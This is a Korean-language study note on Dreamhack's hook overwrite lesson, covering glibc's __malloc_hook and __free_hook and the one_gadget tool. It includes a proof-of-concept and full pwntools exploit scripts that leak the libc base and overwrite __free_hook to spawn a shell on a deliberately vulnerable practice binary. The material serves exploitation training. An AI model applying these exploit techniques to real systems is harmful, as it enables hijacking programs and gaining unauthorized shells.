# [Dreamhack]_Hook_Overwrite

---

### 서론

- 컴퓨터 과학에서 운영체제가 어떤 코드를 실행하려 할 때, 이를 낚아채어 다른 코드가 실행되게 하는 것을 `Hooking(후킹)` 이라고 부르며, 이때 실행되는 코드를 `Hook(훅)` 이라고 부름
- 함수에 훅을 심어서 함수의 호출을 모니터링 하거나, 함수에 기능을 추가할 수 있고, 아예 다른 코드를 심어서 실행 흐름을 변조할 수도 있음
- 예를 들어, `malloc` 과 `free` 에 훅을 설치하면 소프트웨어에서 할당하고, 해제하는 메모리를 모니터링할 수 있음
- 이러한 모니터링 기능을 악용하면 해커가 키보드의 키 입력과 관련된 함수에 훅을 설치하면, 사용자가 입력하는 키를 모니터링하여 자신의 컴퓨터로 전송하는 것도 가능

### 훅 오버라이트(Hoo Overwrite)

- 훅의 특징을 이용한 공격 기법
- Glibc 2.33 이하 버전에서 libc 데이터 영역에는 `malloc()` 과 `free()` 를 호출할 때 함께 호출되는 훅(Hook)이 함수 포인터 형태로 존재
- 이 함수 포인터를 임의의 함수 주소로 **오버라이트(Overwrite)** 하여 악의적인 코드를 실행하는 기법을 진행
- `Full RELRO` 가 적용되더라도 libc의 데이터 영역에는 쓰기가 가능하므로 Full RELRO를 우회하는 기법이기도 함

### 원가젯(one-gadget)

- 기존에 셸을 실행하려면 여러 개의 가젯을 조합해서 ROP Chain을 구성했지만, 원가젯은 **단일 가젯만으로도 셸을 실행할 수 있는 매우 강력한 가젯**
    - 하지만 원 가젯은 Glibc 버전마다 다르게 존재하며, 사용하기 위한 제약 조건도 모두 다름
    - 일반적으로 Glibc 버전이 높아질 수록 제약 조건을 만족하기가 어려워지는 특성이 있음

## 메모리 함수 훅

### malloc, free, realloc hook

- C언어에서 메모리의 동적 할당과 해제를 담당하는 함수로는 `malloc` , `free`, `realloc` 이 대표적
- 각 함수는 [`libc.so`](http://libc.so) 에 구현되어 있음

```c
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__libc_malloc|__libc_free|__libc_realloc"
   463: 00000000000970e0   923 FUNC    GLOBAL DEFAULT   13 __libc_malloc@@GLIBC_2.2.5
   710: 000000000009d100    33 FUNC    GLOBAL DEFAULT   13 __libc_reallocarray@@GLIBC_PRIVATE
  1619: 0000000000098ca0  1114 FUNC    GLOBAL DEFAULT   13 __libc_realloc@@GLIBC_2.2.5
  1889: 00000000000979c0  3633 FUNC    GLOBAL DEFAULT   13 __libc_free@@GLIBC_2.2.5
  1994: 000000000019a9d0   161 FUNC    GLOBAL DEFAULT   14 __libc_freeres@@GLIBC_2.2.5
```

- `libc` 에는 해당 함수들의 디버깅 편의를 위해 훅 변수가 정의되어 있음
- 예를 들어, `malloc` 함수는 `__malloc_hook` 변수의 값이 `NULL` 이 아닌지 검사하고, 아니라면 `malloc` 을 수행하기 전에 `__malloc_hook` 이 가리키는 함수를 먼저 실행
- 이 때, `malloc` 의 인자는 훅 함수에 전달
    - 같은 방식으로 `free`, `realloc` , 도 각각 `__free_hook` , `__realloc_hook` 이라는 훅 변수를 사용함

```c
// __malloc_hook
void *__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook); // malloc hook read
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0)); // call hook
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);
  // ...
}
```

### 훅의 위치와 권한

- `__malloc_hook` , `__free_hook`, `__realloc_hook` 은 관련된 함수들과 마찬가지로 [`libc.so`](http://libc.so) 에 정의 되어 있음
    - `__malloc_hook` , `__free_hook` , `__realloac_hook`

```bash
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__malloc_hook|__free_hook|__realloc_hook"
   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
  1132: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 __malloc_hook@@GLIBC_2.2.5
  1544: 00000000003ebc28     8 OBJECT  WEAK   DEFAULT   34 __realloc_hook@@GLIBC_2.2.5
```

- 해당 변수들의 오프셋은 각각 `0x3ed8e8` , `0x3ebc30` , `0x3ebc28` 인데, 섹션 헤더 정보를 참조하면 [`libc.so`](http://libc.so) 의 `bss` 및 `data` 섹션에 포함됨을 알 수 있음
    - `bss` 및 `data` 섹션은 쓰기가 가능하므로 이 변수들의 값은 조작될 수 있음
    - hook의 섹션
    
    ```bash
    $ readelf -S /lib/x86_64-linux-gnu/libc-2.27.so | grep -EA 1 "\.bss|\.data"
    <-- skipped -->
      [34] .data             PROGBITS         00000000003eb1a0  001eb1a0
           00000000000016c0  0000000000000000  WA       0     0     32
      [35] .bss              NOBITS           00000000003ec860  001ec860
           0000000000004280  0000000000000000  WA       0     0     32
    ```
    

### Hook Overwrite

- 앞서 설명한 바와 같이 `__free_hook`은 `libc` 의 `bss` 섹션에 `__malloc_hook` 과 `__realloc_hook`은 `data` 섹션에 위치하여 실행 중에 덮어쓰는 것이 가능, 또한, 훅을 실행할 때 기존 함수에 전달한 인자를 같이 전달해 주기 때문에 `__malloc_hook` 을 `system` 함수의 주소로 덮고, `malloc("/bin/sh")` 을 호출하여 셸을 획득하는 등의 공격이 가능
- 하단의 코드는 훅을 덮는 공격이 가능함을 보이는 Proof-of-Concept(PoC)코드
- 컴파일하고 실행하면, `__free_hook` 을 `system` 함수로 덮고, `free("/bin/sh")` 를 호출하자 셸이 획득되는 것을 확인할 수 있음

```bash
// Name: fho-poc.c
// Compile: gcc -o fho-poc fho-poc.c

#include <malloc.h>
#include <stdlib.h>
#include <string.h>

const char *buf="/bin/sh";

int main() {
  printf("\"__free_hook\" now points at \"system\"\n");
  __free_hook = (void *)system;
  printf("call free(\"/bin/sh\")\n");
  free(buf);
}

```

```bash
$ ./fho
"__free_hook" now points at "system"
call free("/bin/sh")
$ echo "This is Hook Overwrite!"
This is Hook Overwrite!
```

- `Full RELRO` 가 적용된 바이너리에도 라이브러리의 훅에는 쓰기 권한이 남아있기 때문에 이러한 공격을 고려해볼 수 있음
- `__free_hook` 이나 `__malloc_hook` 과 같은 훅은 libc에 쓰기 권한으로 존재하는 함수포인터이며, 간접적으로 `free()` 와 `malloc()` 을 호출하여 손쉽게 실행이 가능하므로 악용되기 쉬움
- 그래서 보안과 성능 향상을 이유로 Glibc 2.34 버전부터 제거 됨 ㅋㅋ

## Free Hook Overwrite

### 전체 코드

- `%llu` 는 부호 없는 64비트 정수를 입력받을 때 사용

```c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdut, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitrary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

## 분석

### 보호 기법

- `checksec` 을 사용해서 `fho` 바이너리에 적용된 보호 기법을 살펴보면, 그동안 배운 모든 보호 기법이 적용되어 있음

```bash
$ checksec fho
[*] '/home/hhro/dreamhack/fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### 코드 분석

- 매우 큰 스택 버퍼 오버플로우가 발생, 그러나 알고 있는 정보가 없으므로 카나리를 올바르게 덮을 수 없고, 반환 주소도 유의미한 값으로 조작할 수 없음
- 스택에 있는 데이터를 읽는데 사용할 수 있을 것 같음
    
    ```c
      puts("[1] Stack buffer overflow");
      printf("Buf: ");
      read(0, buf, 0x100);
      printf("Buf: %s\n", buf);
    ```
    
- 주소를 입력하고, 그 주소에 임의의 값을 쓸 수 있음
    
    ```c
      puts("[2] Arbitrary-Address-Write");
      printf("To write: ");
      scanf("%llu", &addr);
      printf("With: ");
      scanf("%llu", &value);
      printf("[%p] = %llu\n", addr, value);
      *addr = value;
    ```
    
- 주소를 입력하고, 그 주소의 메모리를 해제할 수 있음
    
    ```c
      puts("[3] Arbitrary-Address-Free");
      printf("To free: ");
      scanf("%llu", &addr);
      free(addr);
    ```
    

### 공격 수단

- 공격자는 다음 세 가지 수단(Primitive)을 이용하여 셸을 획득해야 함
    1. 스택의 어떤 값을 읽을 수 있다.
    2. 임의 주소에 임의 값을 쓸 수 있다.
    3. 임의 주소를 해제할 수 있다.

## 설계

### 1. 라이브러리의 변수 및 함수들의 주소 구하기

- `__free_hook`, `system` 함수, `"/bin/sh"` 문자열을 libc 파일에 정의되어 있으므로, 주어진 libc 파일로부터 이들의 오프셋을 얻을 수 있음
    
    ```bash
    $ readelf -sr libc-2.27.so | grep " __free_hook@"
    0000003eaef0  00dd00000006 R_X86_64_GLOB_DAT 00000000003ed8e8 __free_hook@@GLIBC_2.2.5 + 0
       221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
    
    __free_hook 오프셋 = 0x3ed8e8
    ```
    
    ```bash
    $ readelf -s libc-2.27.so | grep " system@"
      1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
    
    system 함수 오프셋 = 0x4f550
    ```
    
    ```bash
    $ strings -tx libc-2.27.so | grep "/bin/sh"
     1b3e1a /bin/sh
    
    "/bin/sh" 오프셋 = 0x1b3e1a
    ```
    
- 메모리 상에서 이들의 주소를 계산하려면, 프로세스에 매핑된 libc 파일의 베이스 주소를 알아야 함
- libc의 베이스 주소를 알면 거기에 오프셋을 더하여 메모리 상 주소를 구할 수 있음
- 앞서 살펴본 공격 수단 중 1. 을 이용하면 스택에 존재하는 값을 읽을 수 있는데, 스택에는 `libc` 의 주소가 있을 가능성이 매우 큼
- 특히, `main` 함수는 `__libc_start_main` 이라는 라이브러리 함수가 호출하므로 `main` 함수 스택 프레임에 존재하는 반환 주소를 읽으면, 그 주소를 기반으로 libc 베이스 주소를 계산할 수 있고 더불어 변수와 함수들의 주소를 계산할 수 있을 것 같음
    
    ```bash
    $ gdb ./fho
    pwndbg> start
    pwndbg> main
    pwndbg> bt # 현재 스택 프레임 출력
    #0  0x00005555555548be in main ()
    #1  0x00007ffff7a05b97 in __libc_start_main (main=0x5555555548ba <main>, argc=1, argv=0x7fffffffc338, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffc328) at ../csu/libc-start.c:310
    #2  0x00005555555547da in _start ()
    ```
    

### 2. 셸 획득

- 앞서 익스플로잇에 필요한 변수와 함수의 주소를 구한 후 2. 에서 `__free_hook` 의 값을 `system` 함수의 주소로 덮어쓰고, 3. 에서 `"/bin/sh"` 를 해제(free)하게 하면 `system("/bin/sh")` 가 호출되어 셸을 획득할 수 있음

## 익스플로잇

### 1. 라이브러리의 변수 및 함수들의 주소 구하기

- `main` 함수의 반환 주소인 `libc_start_main+x` 를 릭하여 libc 베이스 주소를 구하고 변수 및 함수들의 주소를 계산
- `main` 함수는 라이브러리 함수인 `__libc_start_main` 이 호출하므로, `main` 함수의 스택 프레임에는 `__libc_start_main+x` 로 돌아갈 반환 주소가 저장되어 있을 것임
- `__libc_start_main+x` 는 libc 영역 어딘가에 존재하는 코드이므로, `__libc_start_main+x` 의 주소를 릭한 후 해당 값에서 `libc_start_main+x`의 오프셋을 빼는 방식으로 프로세스 메모리에 매핑된 libc의 베이스 주소를 계산할 수 있음
- 먼저 다음과 같이 gdb로 바이너리를 열고 `main` 함수에 중단점을 설정한 후 실행합니다. `main` 함수에서 멈추었을 때, 모든 스택 프레임의 백트레이스를 출력하는 `bt` 명령어로 `main` 함수의 반환 주소를 알아낼 수 있음
    
    ```bash
    $ gdb fho
    pwndbg> b *main
    Breakpoint 1 at 0x8ba
    pwndbg> r
    pwndbg> bt
    #0  0x00005625b14008ba in main ()
    #1  0x00007f5ae2f1cc87 in __libc_start_main (main=0x5625b14008ba <main>, argc=1, argv=0x7ffdf39f3ed8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffdf39f3ec8) at ../csu/libc-start.c:310
    #2  0x00005625b14007da in _start ()
    pwndbg> x/i 0x00007f5ae2f1cc87
       0x7f5ae2f1cc87 <__libc_start_main+231>:  mov    edi,eax
    pwndbg>
    ```
    
- 위 `#1` 부분에서 확인할 수 있듯이 `main` 함수의 반환 주소는 `0x00007f5ae2f1cc87`이고, `x/i`로 출력해보면 `__libc_start_main+231`입니다. `__libc_start_main+231`의 오프셋은 다음과 같이 `readelf` 명령어로도 얻을 수 있습니다.
    
    ```bash
    $ readelf -s libc-2.27.so | grep " __libc_start_main@"
      2203: 0000000000021b10   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
    
    --> __libc_start_main+231의 오프셋 = 0x21b10+231
    ```
    
- 따라서 `main` 함수의 반환 주소인 `__libc_start_main+231` 를 릭한 후, 해당 값에서 `0x21b10+231` 를 빼면 libc의 베이스 주소를 구할 수 있음
- libc의 베이스 주소를 구한 후에는 `__free_hook`, `system` 함수, `"/bin/sh"` 문자열의 오프셋을 더하여 이들의 주소 값도 계산이 가능
- 라이브러리 변수 및 함수들의 주소 구하기

```python
#!/usr/bin/env python3
# Name: fho.py

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)
```

### 2. 셸 획득

- 구해낸 `__free_hook` , `system` 함수, `"/bin/sh"` 문자열의 주소를 이용하면 셸을 획득할 수 있음
- 왜 `str(system).encode()`를 사용하는가?
    - `str(system).encode()`는 `system` 함수의 주소를 문자열로 변환한 뒤, 이를 바이트 문자열로 인코딩합니다.
    - `scanf`는 문자열 형태로 입력을 받기 때문에, 이를 문자열로 전달해야 합니다.
    - `encode()` 메서드를 사용하여 바이트 문자열로 변환하는 이유는 `pwntools`의 `sendline` 함수가 바이트 문자열을 요구하기 때문입니다.
- `p64`와 `str.encode`의 차이점
    - `p64(freehook)`는 주소를 리틀 엔디안 형식으로 바이트 배열로 변환합니다. 이는 메모리 조작 등에서 직접 주소를 취급할 때 유용하지만, `scanf`와 같은 함수에서 문자열로 입력을 받을 때는 적절하지 않습니다.
    - `str(freehook).encode()`는 숫자를 문자열로 변환하고, 이를 바이트 문자열로 인코딩합니다. 이는 `scanf("%llu", &addr);`와 같은 입력을 받을 때 적합합니다.
- `libc.symbols`와 `libc.search`는 각각 다른 목적을 가지고 있으며, 이를 통해 얻는 값들도 다릅니다. `libc.symbols`는 심볼 테이블에서 특정 함수나 변수의 오프셋을 가져오는 반면, `libc.search`는 주어진 바이트 시퀀스를 바이너리 내에서 검색하여 그 위치를 반환합니다. 따라서 `/bin/sh` 문자열의 위치를 찾기 위해 `next(libc.search(b'/bin/sh'))`를 사용하는 것입니다.
- 차이점 정리
    1. **`libc.symbols`**:
        - `libc.symbols`는 공유 라이브러리(여기서는 `libc`)의 심볼 테이블에서 함수나 전역 변수의 오프셋을 가져옵니다.
        - 예를 들어, `libc.symbols['system']`은 `libc`에서 `system` 함수의 오프셋을 반환합니다.
        - 마찬가지로, `libc.symbols['__free_hook']`은 `libc`에서 `__free_hook` 변수의 오프셋을 반환합니다.
    2. **`libc.search`**:
        - `libc.search`는 주어진 바이트 시퀀스를 라이브러리의 메모리에서 검색합니다.
        - `next(libc.search(b'/bin/sh'))`는 `libc` 바이너리 내에서 `/bin/sh` 문자열을 검색하고, 해당 문자열의 주소를 반환합니다.
        - 이 주소는 문자열 자체가 저장된 위치를 가리킵니다.
- 왜 `next(libc.search(b'/bin/sh'))`를 사용하는가?
    - `/bin/sh` 문자열은 함수나 변수처럼 명시적으로 심볼 테이블에 기록된 항목이 아닙니다.
    - 대신, `libc` 바이너리 내에 하드코딩된 문자열로 존재합니다.
    - 따라서, 심볼 테이블을 통해서가 아니라, 바이너리 전체를 검색하여 문자열의 위치를 찾아야 합니다.

```python
#!/usr/bin/env python3
# Name: fho.py

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
# p.recvline()[:-1]에 값 = b'\x87\xcc\xf1\xe2\x5a\x7f'
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)

# [2] Overwrite `free_hook` with `system`
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()
```

## One_gadget

- **one_gadget** 또는 **magic_gadget** 은 실행하면 셸이 획득되는 코드 뭉치를 말함
- https://github.com/david942j/one_gadget
- 원 가젯은 함수에 인자를 전달하기 어려울 때 유용하게 활용할 수 있음
    - 예를 들어, `__malloc_hook` 을 임의의 값으로 오버라이트할 수 있지만, `malloc` 의 인자에 작은 정수 밖에 입력할 수 없는 상황이라면 `"/bin/sh"` 문자열 주소를 인자로 전달하기 매우 어려움
    - 이럴 때 제약 조건을 만족하는 원 가젯이 존재한다면, 이를 호출해서 셸을 획득할 수 있음

```python
$ one_gadget ./libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

### one_gadget 실습

```python
#!/usr/bin/env python3
# Name: fho_og.py

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
free_hook = libc_base + libc.symbols['__free_hook']
og = libc_base+0x4f432

slog('libc_base', libc_base)
slog('free_hook', free_hook)
slog('one-gadget', og)

# [2] Overwrite `free_hook` with `og`, one-gadget address
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(og).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(0x31337).encode()) # 아무 값이나 입력해도 상관 없음

p.interactive()
```